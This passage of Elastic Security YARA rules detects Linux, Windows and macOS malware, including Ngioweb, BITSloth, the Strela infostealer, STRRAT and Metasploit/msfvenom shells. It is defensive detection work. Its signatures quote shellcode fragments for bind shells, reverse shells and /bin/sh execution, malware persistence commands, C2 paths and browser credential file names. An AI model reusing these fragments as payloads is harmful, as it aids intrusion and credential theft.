        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { 75 E6 B2 07 FE C0 EB DE 83 EC 10 6A 00 6A 00 6A 00 6A 00 FF 74 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_d8573802 {
    meta:
        author = "Elastic Security"
        id = "d8573802-f141-4fd1-b06a-605451a72465"
        fingerprint = "0052566dda66ae0dfa54d68f4ce03b5a2e2a442c4a18d70f16fd02303a446e66"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "7454ee074812d7fa49044de8190e17b5034b3f08625f547d1b04aae4054fd81a"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { 10 40 74 38 51 51 6A 02 FF 74 24 18 FF 93 C8 00 00 00 83 C4 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_7926bc8e {
    meta:
        author = "Elastic Security"
        id = "7926bc8e-110f-4b8a-8cc5-003732b6fcfd"
        fingerprint = "246e06d73a3a61ade6ac5634378489890a5585e84be086e0a81eb7586802e98f"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "555d60bd863caff231700c5f606d0034d5aa8362862d1fd0c816615d59f582f7"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { ED 74 31 48 8B 5B 10 4A 8D 6C 3B FC 48 39 EB 77 23 8B 3B 48 83 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_e2377400 {
    meta:
        author = "Elastic Security"
        id = "e2377400-8884-42fb-b524-9cdf836dac3a"
        fingerprint = "531a8fcb1c097f72cb9876a35ada622dd1129f90515d84b4c245920602419698"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "b88daf00a0e890b6750e691856b0fe7428d90d417d9503f62a917053e340228b"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { EC 08 8B 5C 24 10 8B 43 20 85 C0 74 72 83 7B 28 00 74 6C 83 7B }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_994f1e97 {
    meta:
        author = "Elastic Security"
        id = "994f1e97-c370-4eb2-ac93-b5ebf112f55d"
        fingerprint = "6cc0ace6beb6c1bf4e10f9781bb551c10f48cc23efe9529d92b432b0ff88f245"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { C6 44 24 16 68 C6 44 24 15 63 C6 44 24 14 74 C6 44 24 13 61 C6 44 24 12 77 C6 44 24 11 2F C6 44 24 10 76 C6 44 24 0F 65 C6 44 24 0E 64 C6 44 24 0D 2F }
    condition:
        all of them
}

rule Linux_Trojan_Springtail_35d5b90b {
    meta:
        author = "Elastic Security"
        id = "35d5b90b-f81d-4a10-828b-8315f8e87ca7"
        fingerprint = "ca2d3ea7b23c0fc21afb9cfd2d6561727780bda65d2db1a5780b627ac7b07e66"
        creation_date = "2024-05-18"
        last_modified = "2024-06-12"
        threat_name = "Linux.Trojan.Springtail"
        reference_sample = "30584f13c0a9d0c86562c803de350432d5a0607a06b24481ad4d92cdf7288213"
        severity = 100
        arch_context = "x86, arm64"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $systemd1 = "Description=syslogd"
        $systemd2 = "ExecStart=/bin/sh -c \"/var/log/syslogd\""
        $cron1 = "cron.txt@reboot"
        $cron2 = "/bin/shcrontab"
        $cron3 = "type/var/log/syslogdcrontab cron.txt"
        $uri = "/mir/index.php"
    condition:
        all of them
}

rule Windows_Trojan_BITSloth_05fc3a0a {
    meta:
        author = "Elastic Security"
        id = "05fc3a0a-ce19-4042-90f8-32a43f40616e"
        fingerprint = "520722d4502230eed76b0c53fffb90bd2b818256363bc1393f51c378ff6cdd9b"
        creation_date = "2024-07-16"
        last_modified = "2024-07-26"
        threat_name = "Windows.Trojan.BITSloth"
        reference_sample = "0944b17a4330e1c97600f62717d6bae7e4a4260604043f2390a14c8d76ef1507"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $str_1 = "/%s/index.htm?RspID=%d" wide fullword
        $str_2 = "/%s/%08x.rpl" wide fullword
        $str_3 = "/%s/wu.htm" wide fullword
        $str_4 = "GET_DESKDOP" wide fullword
        $str_5 = "http://updater.microsoft.com/index.aspx" wide fullword
        $str_6 = "[U] update error..." wide fullword
        $str_7 = "RMC_KERNEL ..." wide fullword
        $seq_global_protocol_check = { 81 3D ?? ?? ?? ?? F9 03 00 00 B9 AC 0F 00 00 0F 46 C1 }
        $seq_exit_windows = { 59 85 C0 0F 84 ?? ?? ?? ?? E9 ?? ?? ?? ?? 6A 02 EB ?? 56 EB }
    condition:
        2 of them
}

rule Windows_Trojan_OnlyLogger_ec14d5f2 {
    meta:
        author = "Elastic Security"
        id = "ec14d5f2-5716-47f3-a7fb-98ec2d8679d1"
        fingerprint = "c69da3dfe0a464665759079207fbc0c82e690d812b38c83d3f4cd5998ecee1ff"
        creation_date = "2022-03-22"
        last_modified = "2022-04-12"
        threat_name = "Windows.Trojan.OnlyLogger"
        reference_sample = "f45adcc2aad5c0fd900df4521f404bc9ca71b01e3378a5490f5ae2f0c711912e"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = "KILLME" ascii fullword
        $a2 = "%d-%m-%Y %H" ascii fullword
        $a3 = "/c taskkill /im \"" ascii fullword
        $a4 = "\" /f & erase \"" ascii fullword
        $a5 = "/info.php?pub=" ascii fullword
    condition:
        all of them
}

rule Windows_Trojan_RaspberryRobin_4b4d6899 {
    meta:
        author = "Elastic Security"
        id = "4b4d6899-bcde-4c40-90c9-bbb621aa1ebf"
        fingerprint = "f74bd83ba1ede9b1dce070967aedc7f8df923c7393c69fcf7c4cfcf7988e0f24"
        creation_date = "2023-12-13"
        last_modified = "2024-01-12"
        threat_name = "Windows.Trojan.RaspberryRobin"
        reference_sample = "2f0451f38adb74cb96c857de455887b00c5038b68210294c7f52b0b5ff64cc1e"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a = { 55 89 E5 83 EC 0C 8B 45 08 3D 01 00 10 00 89 45 FC 89 4D F8 73 0F 8B 45 FC 89 45 F4 8B 4D F4 64 8B 11 89 55 F8 8B 45 F8 83 C4 0C 5D C3 }
    condition:
        all of them
}

rule Windows_Trojan_STRRAT_a3e48cd2 {
    meta:
        author = "Elastic Security"
        id = "a3e48cd2-e65f-40db-ab55-8015ad871dd6"
        fingerprint = "efda9a8bd5f9e227a6696de1b4ea7eb7343b08563cfcbe73fdd75164593bd111"
        creation_date = "2024-03-13"
        last_modified = "2024-03-21"
        threat_name = "Windows.Trojan.STRRAT"
        reference_sample = "97e67ac77d80d26af4897acff2a3f6075e0efe7997a67d8194e799006ed5efc9"
        severity = 100
        arch_context = "x86"
        scan_context = "memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $str1 = "strigoi/server/ping.php?lid="
        $str2 = "/strigoi/server/?hwid="
    condition:
        all of them
}

rule Windows_Infostealer_Strela_0dc3e4a1 {
    meta:
        author = "Elastic Security"
        id = "0dc3e4a1-13ac-4461-aac9-896f9e30d84b"
        fingerprint = "76ba0b9c5e892afc335d101dfc30355b6d704f2d723a81ddbae1cf2026ea85a4"
        creation_date = "2024-03-25"
        last_modified = "2024-09-30"
        threat_name = "Windows.Infostealer.Strela"
        reference_sample = "e6991b12e86629b38e178fef129dfda1d454391ffbb236703f8c026d6d55b9a1"
        severity = 100
        arch_context = "x86"
        scan_context = "memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $s1 = "strela" fullword
        $s2 = "/server.php" fullword
        $s3 = "/out.php" fullword
        $s4 = "%s%s\\key4.db" fullword
        $s5 = "%s%s\\logins.json" fullword
        $s6 = "%s,%s,%s\n" fullword
        $old_pdb = "Projects\\StrelaDLLCompile\\Release\\StrelaDLLCompile.pdb" fullword
    condition:
        3 of ($s*) or $old_pdb
}

rule MacOS_Trojan_Metasploit_6cab0ec0 {
    meta:
        author = "Elastic Security"
        id = "6cab0ec0-0ac5-4f43-8a10-1f46822a152b"
        fingerprint = "e13c605d8f16b2b2e65c717a4716c25b3adaec069926385aff88b37e3db6e767"
        creation_date = "2021-09-30"
        last_modified = "2021-10-25"
        threat_name = "MacOS.Trojan.Metasploit"
        reference_sample = "7ab5490dca314b442181f9a603252ad7985b719c8aa35ddb4c3aa4b26dcc8a42"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "macos"
    strings:
        $a = "mettlesploit! " ascii fullword
    condition:
        all of them
}

rule MacOS_Trojan_Metasploit_293bfea9 {
    meta:
        author = "Elastic Security"
        id = "293bfea9-c5cf-4711-bec0-17a02ddae6f2"
        fingerprint = "d47e8083268190465124585412aaa2b30da126083f26f3eda4620682afd1d66e"
        creation_date = "2021-09-30"
        last_modified = "2021-10-25"
        threat_name = "MacOS.Trojan.Metasploit"
        reference_sample = "7ab5490dca314b442181f9a603252ad7985b719c8aa35ddb4c3aa4b26dcc8a42"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "macos"
    strings:
        $a1 = "_webcam_get_frame" ascii fullword
        $a2 = "_get_process_info" ascii fullword
        $a3 = "process_new: got %zd byte executable to run in memory" ascii fullword
        $a4 = "Dumping cert info:" ascii fullword
    condition:
        all of them
}

rule MacOS_Trojan_Metasploit_448fa81d {
    meta:
        author = "Elastic Security"
        id = "448fa81d-14c7-479b-8d1e-c245ee261ef6"
        fingerprint = "ff040211f664f3f35cd4f4da0e5eb607ae3e490aae75ee97a8fb3cb0b08ecc1f"
        creation_date = "2021-09-30"
        last_modified = "2021-10-25"
        threat_name = "MacOS.Trojan.Metasploit"
        reference_sample = "7ab5490dca314b442181f9a603252ad7985b719c8aa35ddb4c3aa4b26dcc8a42"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "macos"
    strings:
        $a1 = "/Users/vagrant/mettle/mettle/src/process.c" ascii fullword
        $a2 = "/Users/vagrant/mettle/mettle/src/c2_http.c" ascii fullword
        $a3 = "/Users/vagrant/mettle/mettle/src/mettle.c" ascii fullword
    condition:
        any of them
}

rule MacOS_Trojan_Metasploit_c7b7a90b {
    meta:
        author = "Elastic Security"
        id = "c7b7a90b-aaf2-482d-bb95-dee20a75379e"
        fingerprint = "c4b2711417f5616ca462149882a7f33ce53dd1b8947be62fe0b818c51e4f4b2f"
        creation_date = "2021-09-30"
        last_modified = "2021-10-25"
        description = "Byte sequence based on Metasploit stager reverse_tcp.rb"
        threat_name = "MacOS.Trojan.Metasploit"
        reference = "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/osx/x86/reverse_tcp.rb"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "macos"
    strings:
        $a1 = { 31 C0 99 50 40 50 40 50 52 B0 61 CD 80 72 }
    condition:
        all of them
}

rule MacOS_Trojan_Metasploit_4bd6aaca {
    meta:
        author = "Elastic Security"
        id = "4bd6aaca-f519-4d20-b3af-d376e0322a7e"
        fingerprint = "f4957b565d2b86c79281a0d3b2515b9a0c72f9c9c7b03dae18a3619d7e2fc3dc"
        creation_date = "2021-09-30"
        last_modified = "2021-10-25"
        description = "Byte sequence based on Metasploit stager x86 bind_tcp.rb"
        threat_name = "MacOS.Trojan.Metasploit"
        reference = "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/osx/x86/bind_tcp.rb"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "macos"
    strings:
        $a1 = { 31 C0 99 50 40 50 40 50 52 B0 61 CD 80 0F 82 7D }
    condition:
        all of them
}

rule MacOS_Trojan_Metasploit_5e5b685f {
    meta:
        author = "Elastic Security"
        id = "5e5b685f-1b6b-4102-b54d-91318e418c6c"
        fingerprint = "52c41d4fc4d195e702523dd2b65e4078dd967f9c4e4b1c081bc04d88c9e4804f"
        creation_date = "2021-10-05"
        last_modified = "2021-10-25"
        threat_name = "MacOS.Trojan.Metasploit"
        reference_sample = "cdf0a3c07ef1479b53d49b8f22a9f93adcedeea3b869ef954cc043e54f65c3d0"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "macos"
    strings:
        $a1 = { 00 00 F4 90 90 90 90 55 48 89 E5 48 81 EC 60 20 00 00 89 F8 48 8B 0D 74 23 00 }
    condition:
        all of them
}

rule Windows_VulnDriver_RtCore_4eeb2ce5 {
    meta:
        author = "Elastic Security"
        id = "4eeb2ce5-e481-4e9c-beda-2b01f259ed96"
        fingerprint = "ce2b0a6b9f1168b692362ef39c7014a41941555de6aed8c41fea016e931331b8"
        creation_date = "2022-04-04"
        last_modified = "2025-01-29"
        threat_name = "Windows.VulnDriver.RtCore"
        reference_sample = "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd"
        severity = 50
        arch_context = "x86"
        scan_context = "file"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $str1 = "\\Device\\RTCore64" wide fullword
        $str2 = "Kaspersky Lab Anti-Rootkit Monitor Driver" wide fullword
    condition:
        int16(uint32(0x3C) + 0x5c) == 0x0001 and uint32(uint32(0x3C) + 8) < 1713095596 and $str1 and not $str2
}

rule Linux_Trojan_Metasploit_69e20012 {
    meta:
        author = "Elastic Security"
        id = "69e20012-4f5d-42ce-9913-8bf793d2a695"
        fingerprint = "263efec478e54c025ed35bba18a0678ceba36c90f42ccca825f2ba1202e58248"
        creation_date = "2024-05-03"
        last_modified = "2024-05-21"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "debb5d12c1b876f47a0057aad19b897c21f17de7b02c0e42f4cce478970f0120"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $mmap = { 31 FF 6A 09 58 99 B6 10 48 89 D6 4D 31 C9 6A 22 41 5A 6A 07 5A 0F 05 48 85 C0 78 }
        $socket = { 41 59 50 6A 29 58 99 6A 02 5F 6A 01 5E [0-6] 0F 05 48 85 C0 78 }
        $connect = { 51 48 89 E6 6A 10 5A 6A 2A 58 0F 05 59 48 85 C0 79 }
        $failure_handler = { 57 6A 23 58 6A 00 6A 05 48 89 E7 48 31 F6 0F 05 59 59 5F 48 85 C0 79 }
        $exit = { 6A 3C 58 6A 01 5F 0F 05 }
        $receive = { 5A 0F 05 48 85 C0 78 }
    condition:
        all of them
}

rule Linux_Trojan_Metasploit_0c629849 {
    meta:
        author = "Elastic Security"
        id = "0c629849-8127-4fec-a225-da29bf41435e"
        fingerprint = "3e98ffa46e438421056bf4424382baa6fbe30e5fc16dbd227bceb834873dbe41"
        creation_date = "2024-05-03"
        last_modified = "2024-05-21"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "ad070542729f3c80d6a981b351095ab8ac836b89a5c788dff367760a2d8b1dbb"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $socket_call = { 6A 29 58 6A 0A 5F 6A 01 5E 31 D2 0F 05 50 5F }
        $populate_sockaddr_in6 = { 99 52 52 52 66 68 }
        $calls = { 6A 31 58 6A 1C 5A 0F 05 6A 32 58 6A 01 5E 0F 05 6A 2B 58 99 52 52 54 5E 6A 1C 48 8D 14 24 0F 05 }
        $dup2 = { 48 97 6A 03 5E 6A 21 58 FF CE 0F 05 E0 F7 }
        $exec_call = { 6A 3B 58 99 48 BB 2F 62 69 6E 2F 73 68 00 53 54 5F 0F 05 }
    condition:
        all of them
}

rule Linux_Trojan_Metasploit_da378432 {
    meta:
        author = "Elastic Security"
        id = "da378432-d549-4ba8-9e33-a0d0656fc032"
        fingerprint = "db6e226c18211d845c3495bb39472646e64842d4e4dd02d9aad29178fd22ea95"
        creation_date = "2024-05-03"
        last_modified = "2024-05-21"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "277499da700e0dbe27269c7cfb1fc385313c4483912a9a3f0c15adba33ecd0bf"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $str1 = { 6A 29 58 99 6A 02 5F 6A 01 5E 0F 05 48 97 }
        $str2 = { 6A 10 5A 6A ?? 58 0F }
        $str3 = { 6A 03 5E 48 FF CE 6A 21 58 0F 05 75 F6 6A 3B 58 99 48 BB 2F 62 69 6E 2F 73 68 00 53 48 89 E7 52 57 48 89 E6 0F 05 }
    condition:
        all of them
}

rule Linux_Trojan_Metasploit_5d26689f {
    meta:
        author = "Elastic Security"
        id = "5d26689f-3d3a-41f1-ac32-161b3b312b74"
        fingerprint = "b78fda9794dc24507405fc04bdc0a3e8abfcdc5c757787b7d9822f4ea2190120"
        creation_date = "2024-05-07"
        last_modified = "2024-05-21"
        description = "Detects x86 msfvenom bind TCP random port payloads"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "dafefb4d79d848384442a697b1316d93fef2741fca854be744896ce1d7f82073"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $tiny_bind = { 31 D2 52 68 2F 2F 73 68 68 2F 62 69 6E 68 2D 6C 65 2F 89 E7 52 68 2F 2F 6E 63 68 2F 62 69 6E 89 E3 52 57 53 89 E1 31 C0 B0 0B CD 80 }
        $reg_bind_setup = { 31 DB F7 E3 B0 66 43 52 53 6A 02 89 E1 CD 80 52 50 89 E1 B0 66 B3 04 CD 80 B0 66 43 CD 80 59 93 }
        $reg_bind_dup_loop = { 6A 3F 58 CD 80 49 79 }
        $reg_bind_execve = { B0 0B 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 41 CD 80 }
    condition:
        ($tiny_bind) or (all of ($reg_bind*))
}

rule Linux_Trojan_Metasploit_1c8c98ae {
    meta:
        author = "Elastic Security"
        id = "1c8c98ae-46c8-45fe-ab42-7b053f0357ed"
        fingerprint = "a3b592cc6d9b00f76a1084c7c124cc199149ada5b8dc206cff3133718f045c9d"
        creation_date = "2024-05-07"
        last_modified = "2024-05-21"
        description = "Detects x86 msfvenom add user payloads"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "1a2c40531584ed485f3ff532f4269241a76ff171956d03e4f0d3f9c950f186d4"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $str1 = { 31 C9 89 CB 6A 46 58 CD 80 6A 05 58 31 C9 51 68 73 73 77 64 68 2F 2F 70 61 68 2F 65 74 63 89 E3 41 B5 04 CD 80 93 }
        $str2 = { 59 8B 51 FC 6A 04 58 CD 80 6A 01 58 CD 80 }
    condition:
        all of them
}

rule Linux_Trojan_Metasploit_47f4b334 {
    meta:
        author = "Elastic Security"
        id = "47f4b334-619b-4b9c-841d-b00c09dd98e5"
        fingerprint = "955d65f1097ec9183db8bd3da43090f579a27461ba345bb74f62426734731184"
        creation_date = "2024-05-07"
        last_modified = "2024-05-21"
        description = "Detects x86 msfvenom exec payloads"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "c3821f63a7ec8861a6168b4bb494bf8cbac436b3abf5eaffbc6907fd68ebedb8"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $payload1 = { 31 C9 F7 E1 B0 0B [0-1] 68 2F ?? ?? ?? 68 2F 62 69 6E 89 E3 CD 80 }
        $payload2a = { 31 DB F7 E3 B0 0B 52 }
        $payload2b = { 88 14 1E 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 56 57 53 89 E1 CD 80 }
        $payload3a = { 6A 0B 58 99 52 }
        $payload3b = { 89 E7 68 2F 73 68 00 68 2F 62 69 6E 89 E3 52 E8 }
        $payload3c = { 57 53 89 E1 CD 80 }
    condition:
        $payload1 or (all of ($payload2*)) or (all of ($payload3*))
}

rule Linux_Trojan_Metasploit_0b014e0e {
    meta:
        author = "Elastic Security"
        id = "0b014e0e-3f5a-4dcc-8860-eb101281b8a5"
        fingerprint = "7a61a0e169bf6aa8760b42c5b260dee453ea6a85fe9e5da46fb7598994904747"
        creation_date = "2024-05-07"
        last_modified = "2024-05-21"
        description = "Detects x64 msfvenom exec payloads"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "a24443331508cc72b3391353f91cd009cafcc223ac5939eab12faf57447e3162"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $payload1 = { 48 B8 2F [0-1] 62 69 6E 2F 73 68 ?? ?? 50 54 5F 52 5E 6A 3B 58 0F 05 }
        $payload2a = { 48 B8 2F 2F 62 69 6E 2F 73 68 99 EB ?? 5D 52 5B }
        $payload2b = { 54 5E 52 50 54 5F 52 55 56 57 54 5E 6A 3B 58 0F 05 }
        $payload3a = { 48 B8 2F 62 69 6E 2F 73 68 00 99 50 54 5F 52 }
        $payload3b = { 54 5E 52 E8 }
        $payload3c = { 56 57 54 5E 6A 3B 58 0F 05 }
    condition:
        $payload1 or (all of ($payload2*)) or (all of ($payload3*))
}

rule Linux_Trojan_Metasploit_ed4b2c85 {
    meta:
        author = "Elastic Security"
        id = "ed4b2c85-730f-4a77-97ed-5439a0493a4a"
        fingerprint = "c38513fa6b1ed23ec91ae316af9793c5c01ac94b43ba5502f9c32a0854aec96f"
        creation_date = "2024-05-07"
        last_modified = "2024-05-21"
        description = "Detects x64 msfvenom bind TCP random port payloads"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "0709a60149ca110f6e016a257f9ac35c6f64f50cfbd71075c4ca8bfe843c3211"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $str = { 6A 29 58 99 6A 01 5E 6A 02 5F 0F 05 97 B0 32 0F 05 96 B0 2B 0F 05 97 96 FF CE 6A 21 58 0F 05 75 ?? 52 48 BF 2F 2F 62 69 6E 2F 73 68 57 54 5F B0 3B 0F 05 }
    condition:
        all of them
}

rule Linux_Trojan_Metasploit_2b0ad6f0 {
    meta:
        author = "Elastic Security"
        id = "2b0ad6f0-44d2-4e7e-8cca-2b0ae1b88d48"
        fingerprint = "b15da42f957107d54bfad78eff3a703cc2a54afcef8207d42292f2520690d585"
        creation_date = "2024-05-07"
        last_modified = "2024-05-21"
        description = "Detects x64 msfvenom find TCP port payloads"
        threat_name = "Linux.Trojan.Metasploit"
        reference_sample = "aa2bce61511c72ac03562b5178aad57bce8b46916160689ed07693790cbfbeec"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $str1 = { 48 31 FF 48 31 DB B3 18 48 29 DC 48 8D 14 24 48 C7 02 10 00 00 00 48 8D 74 24 08 6A 34 58 0F 05 48 FF C7 }
        $str2 = { 48 FF CF 6A 02 5E 6A 21 58 0F 05 48 FF CE 79 }
        $str3 = { 48 89 F3 BB 41 2F 73 68 B8 2F 62 69 6E 48 C1 EB 08 48 C1 E3 20 48 09 D8 50 48 89 E7 48 31 F6 48 89 F2 6A 3B 58 0F 05 }
    condition:
        all of them
}